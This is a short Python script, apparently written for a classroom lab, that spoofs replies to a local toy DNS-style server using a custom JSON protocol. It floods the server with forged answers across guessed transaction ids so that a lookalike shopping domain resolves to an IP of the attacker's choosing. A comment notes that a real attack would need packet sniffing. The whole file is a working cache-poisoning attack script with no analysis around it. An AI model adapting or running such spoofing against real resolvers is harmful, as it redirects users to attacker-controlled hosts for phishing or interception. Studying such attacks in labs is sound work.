import socket
import json
import time

LOCAL_SERVER_ADDR = ("127.0.0.1", 21000)
SPOOFED_IP = "1.1.1.1"
TARGET_DOMAIN = "shop.amazone.com" 

udp_conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def create_fake_response(txid):
    response_msg = {
        "txid": txid,
        "flag": "0001", 
        "answer": {
            "name": TARGET_DOMAIN,
            "type": "A",
            "ttl": 3600,
            "result": SPOOFED_IP
        }
    }
    return json.dumps(response_msg)

try:
    while True:
        for i in range(20):
            # since its txid is just txid + 1 we can just get away with this 
            # IRL we'd have to sniff
            fake_payload = create_fake_response(i)
            udp_conn.sendto(fake_payload.encode(), LOCAL_SERVER_ADDR)

        time.sleep(0.01)
except KeyboardInterrupt:
    print("\nSpoofer stopped.")
finally:
    udp_conn.close()